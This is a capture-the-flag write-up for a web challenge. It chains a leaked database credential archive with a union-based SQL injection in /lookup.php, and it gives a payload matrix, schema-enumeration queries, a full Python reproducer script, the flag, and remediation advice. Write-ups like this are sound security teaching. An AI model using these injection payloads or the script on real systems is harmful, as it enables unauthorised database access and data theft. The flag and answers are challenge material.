# Between Us — CTF Writeup

**Challenge:** Between Us (450 pts)
**Category:** Web
**Target:** `http://54.72.82.22:8140`
**Flag:** `safctf{73c4979d1dccb358dbfbaca5233666ca}`
**Vulnerability:** Union-based SQL injection (CWE-89) in `/lookup.php`, preceded by an exposed credential archive (CWE-538)
**Difficulty:** Medium — a two-stage chain, but each stage is short once the riddle is read

---

## 1. Summary

"Every neighborhood has a story worth hearing. Someone talked. A detail slipped out…"
— that is the challenge in one line, and it is literally the kill chain:

1. `/robots.txt` does not list crawler rules. It tells a fable about secrets, and
   interrupts itself to ask: *"are you a snitch or can you **zip** :-)"*.
2. The landing page links `/secrets.zip`. That archive contains a **Prisma
   datasource URL** with live database credentials — *the detail that slipped out*.
3. The credentials point at PostgreSQL on `localhost:8032`, which is **not**
   reachable from outside. They are a hint, not the entry point.
4. The actual way in is `/lookup.php?name=`, which concatenates user input directly
   into a SQL query. It is injectable on the first try.
5. The app connects as a deliberately restricted role, `snitch_reader` — but that
   role can still read `super_secret.secret`, which holds the flag.

The only input validation anywhere is a **120-byte length cap**, which is a UX guard
rather than a security control. Every payload used below is well under it.

---

## 2. Reconnaissance

### 2.1 Service fingerprint

```
$ nmap -Pn -sV -p 8140 54.72.82.22
PORT     STATE SERVICE VERSION
8140/tcp open  http    Apache httpd 2.4.68 ((Debian))
```

A different stack from the neighbouring challenge ports (those were Werkzeug/Flask).
Apache + Debian here, and the landing-page link `/lookup.php` confirms PHP.

### 2.2 Landing page

`GET /` is "THE DAILY SCOOP", a celebrity-newsroom skin. The only functional content
is two links:

```html
<a href="/secrets.zip">Open the press pack</a>
<a href="/lookup.php">Search the archive</a>
```

### 2.3 `robots.txt` — the riddle

`/robots.txt` returns **200** with a short story, not a rules file. It opens with
`## There is nothing to see here ##` and then, after a paragraph about a valley where
"everyone could hear each other's minds… for Secrets had yet to be born":

> Before we continue, I want to know; are you are a snitch or can you zip :-) when we
> share with you our secrets :-(

Two words matter: **zip** and **snitch**. The first points at `/secrets.zip`; the
second turns out to be the name of the database role we will be running as (§5.3).

---

## 3. Stage one — the leaked secret

```
$ GET /secrets.zip          → 200, 659 bytes
   sha256 9121f0862523f6859644822cdf451fc1e20ac46505993dd183ca6f4a0f648420

$ unzip -l secrets.zip
      Length      Date    Time    Name
          260  2024-09-26 16:14   secrets
          220  2024-09-26 16:14   __MACOSX/._secrets

$ cat secrets
## Seems you can be trusted. To access our secrets

------- For your eyes only ----------
datasource db {
provider = "postgresql"
url = "postgresql://olwen:Olwen+SereneVale#2024@localhost:8032/olwendb?schema=public"
}
------- To be deleted soon --------------
```

A live **Prisma datasource block** for `olwendb` on `localhost:8032`, with the
password `Olwen+SereneVale#2024` for user `olwen`.

This is a dead end *by itself* — `:8032` is bound to loopback inside the container and
is not exposed on the host — but it tells us exactly what the application is talking
to, and it establishes the theme: credentials left where they should not be. The
closing line *"— To be deleted soon —"* is the organizers winking at the fact.

---

## 4. Stage two — SQL injection in `/lookup.php`

### 4.1 The endpoint

`GET /lookup.php` renders a "Newsroom records" panel with a single field:

```html
<h1>Newsroom records</h1>
<ul><li>Olwen</li></ul>
<form><label>Case name <input name="name" value="Olwen"></label><button>Search</button></form>
```

The search is a case-sensitive exact match on `name`:

| Request | Result |
|---|---|
| `?name=Olwen` | `<li>Olwen</li>` |
| `?name=olwen` | *(empty)* |
| `?name=O` | *(empty)* |
| `?name=` | `<li>Olwen</li>` *(default)* |

### 4.2 Confirming injection

| Payload | HTTP | Result | Reading |
|---|---|---|---|
| `Olwen` | 200 | `Olwen` | baseline |
| `Olwen'` | **503** | — | unbalanced quote → **syntax error reaches the DB** |
| `Olwen''` | 200 | *(empty)* | doubled quote is an in-string escape → the string is `Olwen'` |
| `Olwen'--` | 200 | `Olwen` | `--` comments out the remainder |
| `' OR '1'='1` | 200 | `Olwen, Riann` | **tautology returns every row** |
| `Olwen' AND 1=1--` | 200 | `Olwen` | boolean-true |
| `Olwen' AND 1=2--` | 200 | *(empty)* | boolean-false |

That set is conclusive. `Olwen''` returning 200-empty (rather than an error) proves the
application performs **no escaping at all** — it is raw string concatenation, and the
quote we send lands verbatim inside the SQL string literal. `Olwen'--` and
`AND 1=2--` confirm a PostgreSQL-style comment and a boolean-predicate injection point.

The underlying query is therefore shape:

```sql
SELECT name FROM users WHERE name = '<NAME>'      -- single column, one table
```

### 4.3 Column count

`UNION SELECT NULL--` with one column returns 200; two or more columns returns 503
(syntax error). **One column.**

```sql
zzz' UNION SELECT NULL--            → 200
zzz' UNION SELECT NULL,NULL--       → 503
```

### 4.4 Query context

```
zzz' UNION SELECT version()--           → PostgreSQL 15.19 on x86_64-pc-linux-musl,
                                          compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
zzz' UNION SELECT current_database()--  → olwendb
zzz' UNION SELECT current_user--        → snitch_reader
```

PostgreSQL 15 running on Alpine, in the database named by the leaked DSN — and the
connecting role is **`snitch_reader`**, the "snitch" the robots.txt fable asked about.

### 4.5 The 120-byte input guard

Some longer payloads returned **HTTP 400** with the body `Invalid case name`, so there
*is* a validation layer. Bisecting it shows the rule is purely length:

```
name of length 120  → 200
name of length 121  → 400 Invalid case name

utf8 'é'×60  (120 bytes) → 200
utf8 'é'×64  (128 bytes) → 400
```

So the check is `strlen($name) > 120`, counting **bytes**. It is a sanity/DoS guard —
it blocks nothing but length, and it constrains only how *verbose* a payload may be.
Note the multi-byte behaviour: because the count is bytes, a payload can be widened in
characters but not in bytes.

This is worth stating plainly in a writeup because it is easy to mistake for a WAF.
It is not: `' OR '1'='1`, `--`, `UNION SELECT`, `information_schema`, `string_agg`,
`||`, `::` and subqueries all pass through untouched.

---

## 5. Exploitation

### 5.1 Enumerate the schema

```sql
zzz' UNION SELECT string_agg(table_name,', ')
      FROM information_schema.tables WHERE table_schema='public'--
→ users, super_secret
```

Two tables. The name `super_secret` is not subtle.

```sql
zzz' UNION SELECT string_agg(column_name,', ')
      FROM information_schema.columns WHERE table_name='super_secret'--
→ id, secret

zzz' UNION SELECT string_agg(column_name,', ')
      FROM information_schema.columns WHERE table_name='users'--
→ id, name
```

### 5.2 Check the data volumes

```sql
zzz' UNION SELECT count(*)::text FROM super_secret--   → 1
zzz' UNION SELECT count(*)::text FROM users--          → 2

zzz' UNION SELECT string_agg(id::text||':'||name,', ') FROM users--
→ 1:Olwen, 2:Riann
```

### 5.3 Read the flag

```sql
zzz' UNION SELECT secret FROM super_secret--
→ safctf{73c4979d1dccb358dbfbaca5233666ca}
```

```
[+] FLAG: safctf{73c4979d1dccb358dbfbaca5233666ca}
```

The whole thing is one row, one column, one request — 44 bytes of payload against a
120-byte budget.

> **Note on `snitch_reader`.** The application does *not* connect as the `olwen` superuser
> whose credentials leaked; it uses a restricted role. That is good practice and it did
> contain the blast radius — but `snitch_reader` still had `SELECT` on `super_secret`, so
> the containment was only partial. Least privilege limited *what else* was reachable; it
> did not protect the flag table, because the flag table was reachable by design.

---

## 6. Flag

```
safctf{73c4979d1dccb358dbfbaca5233666ca}
```

---

## 7. Root cause & remediation

**Root cause (two independent defects, either of which is sufficient to fail):**

1. **Untrusted input concatenated into SQL.** `name` is interpolated straight into a
   query string with no escaping and no parameter binding.
2. **A credential archive published on the web root.** `/secrets.zip` was left in the
   document root, world-readable, containing a live (if internal) database DSN.

**Fixes:**

1. **Use parameterised queries — this is the whole fix for defect 1.**

   ```php
   $st = $pdo->prepare('SELECT name FROM users WHERE name = :name');
   $st->execute([':name' => $_GET['name'] ?? 'Olwen']);
   foreach ($st->fetchAll(PDO::FETCH_COLUMN) as $row) { /* ... */ }
   ```

   With binding, the quote is data, not syntax — `Olwen'` becomes a search for a
   person literally named `Olwen'` and returns nothing, instead of a 503. Escaping
   helpers (`mysqli_real_escape_string`) are a weaker substitute; use binding.

2. **Delete the archive, and never ship secrets in the web root.** `.zip`, `.bak`,
   `.old`, `.env`, `.git/` and editor backups must be outside the document root and
   blocked by the vhost. Add a deny rule as defence in depth:

   ```apache
   <FilesMatch "\.(zip|bak|old|env|sql|tar|gz)$">
       Require all denied
   </FilesMatch>
   ```

3. **Rotate the exposed credential.** `Olwen+SereneVale#2024` was published to the
   internet and must be considered compromised even though `:8032` was loopback-bound.
   The DSN should come from the environment/secret store, not a file in the tree.

4. **Do not rely on a length check as security.** The `strlen > 120` guard is fine as
   input hygiene, but it stops no injection. If a real WAF or validation layer is
   wanted, it must be *in addition to* parameterised queries, never instead of them.

5. **Least privilege on the flag table.** Letting the web role `SELECT` from
   `super_secret` means any read primitive in the app becomes total. If the flag (or
   any secret) must live in the same database, it should live in a schema the web role
   cannot read — the point of `snitch_reader` was sound, its grant simply went one
   table too far.

---

## 8. References

* HackTricks — *SQL Injection* → "Exploiting Union Based": extracting database,
  table and column names via `information_schema` (sourced through BlackBook
  `knowledge_research`, chunk 123601)
* PayloadsAllTheThings — *SQL Injection* (via BlackBook)
* 0xdf — *HTB: Gavel* and *HTB: EarlyAccess*: comparable cases of one parameter
  slipping past otherwise-correct prepared statements, and of second-order injection
  (cited as related cases by BlackBook)
* CWE-89 — *Improper Neutralization of Special Elements used in an SQL Command*
* CWE-538 — *Insertion of Sensitive Information into Externally-Accessible File or
  Directory*
* OWASP — *SQL Injection Prevention Cheat Sheet* (query parameterisation)

---

## Appendix A — Reproducer script

Saved alongside this writeup as `between-us/solve.py`. Verified output is quoted in
Appendix B.

```python
#!/usr/bin/env python3
"""Between Us (Safcom CTF, :8140) — SQL injection in /lookup.php?name=

  1. /robots.txt riddle points at /secrets.zip
  2. secrets.zip leaks a Prisma datasource URL (user olwen)
  3. The app itself reads the DB as the *restricted* role `snitch_reader`
  4. /lookup.php?name= concatenates the param straight into SQL -> UNION injection
  5. super_secret.secret holds the flag
"""
import io, re, urllib.error, urllib.parse, urllib.request, zipfile

BASE = "http://54.72.82.22:8140"
MAXLEN = 120  # server rejects inputs longer than this


def _get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=20) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def lookup(name):
    qs = urllib.parse.urlencode({"name": name})
    status, body = _get("/lookup.php?" + qs)
    html = body.decode("utf-8", "replace")
    m = re.search(r"<ul>([\s\S]*?)</ul>", html, re.I)
    rows = [] if not m else [x.strip() for x in
                             re.findall(r"<li>([\s\S]*?)</li>", m.group(1), re.I)]
    return status, rows


def sqli(expr):
    payload = f"zzz' UNION SELECT {expr}--"
    assert len(payload) <= MAXLEN, f"payload {len(payload)}B exceeds cap {MAXLEN}"
    return lookup(payload)


if __name__ == "__main__":
    status, blob = _get("/secrets.zip")
    creds = zipfile.ZipFile(io.BytesIO(blob)).read("secrets").decode()
    print("[1] leaked DSN:", re.search(r'url\s*=\s*"([^"]+)"', creds).group(1))

    for label, p in [("tautology", "' OR '1'='1"), ("quote->error", "Olwen'")]:
        print(f"[2] {label:14}", lookup(p))

    for e in ["version()", "current_database()", "current_user"]:
        print(f"[3] {e:20}", sqli(e)[1])

    print("[4] tables      :", sqli("string_agg(table_name,', ') FROM "
          "information_schema.tables WHERE table_schema='public'")[1])
    print("[+] FLAG        :", sqli("secret FROM super_secret")[1])
```

---

## Appendix B — Raw evidence

### Verified reproducer output

```
[1] /robots.txt riddle -> /secrets.zip
    zip members : ['secrets', '__MACOSX/._secrets']
    contents    : ## Seems you can be trusted. To access our secrets |  | -------
                  For your eyes only ---------- | datasource db { | provider =
                  "postgresql" | url = "postgresql://olwen:Olwen+SereneVale#2024
                  @localhost:8032/olwendb?schema=public" | } | ------- To be
                  deleted soon --------------
    leaked DSN  : postgresql://olwen:Olwen+SereneVale#2024@localhost:8032/olwendb?schema=public
    NOTE: Postgres listens on localhost:8032 — not reachable from outside.

[2] Injection probes
    Olwen                    200  ['Olwen']
    olwen (case-sensitive)   200  []
    quote -> error           503  []
    tautology                200  ['Olwen', 'Riann']
    comment                  200  ['Olwen']

[3] Query context
    version()            -> PostgreSQL 15.19 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
    current_database()   -> olwendb
    current_user         -> snitch_reader

[4] Schema discovery + flag
    tables          : ['users, super_secret']
    super_secret    : ['id, secret']
    users           : ['Olwen, Riann']
    secret          : ['safctf{73c4979d1dccb358dbfbaca5233666ca}']

[+] FLAG: safctf{73c4979d1dccb358dbfbaca5233666ca}
```

### Injection matrix (raw)

```
200  "Olwen"                 -> <li>Olwen</li>
200  "olwen"                 -> (empty)
200  "O"                     -> (empty)
503  "Olwen'"                -> (no <ul>)          syntax error
200  "Olwen''"               -> (empty)             quote escaped -> "Olwen'"
200  "Olwen'--"              -> <li>Olwen</li>
200  "' OR '1'='1"           -> <li>Olwen</li><li>Riann</li>
200  "Olwen' OR 1=1--"       -> <li>Olwen</li><li>Riann</li>
200  "Olwen' AND 1=1--"      -> <li>Olwen</li>
200  "Olwen' AND 1=2--"      -> (empty)
200  "\" OR \"1\"=\"1"       -> (empty)             double-quote is not the delimiter
200  "Olwen\\"               -> (empty)
```

### Length guard boundary (raw)

```
ascii len 120 -> 200
ascii len 121 -> 400 Invalid case name
utf8 'é'*60 (120 bytes) -> 200
utf8 'é'*64 (128 bytes) -> 400
```

### The archive

```
$ file secrets.zip
secrets.zip: Zip archive data, made by v2.0 UNIX, extract using at least v2.0,
last modified Sep 26 2024 16:14:24, uncompressed size 260, method=deflate

sha256  9121f0862523f6859644822cdf451fc1e20ac46505993dd183ca6f4a0f648420
```
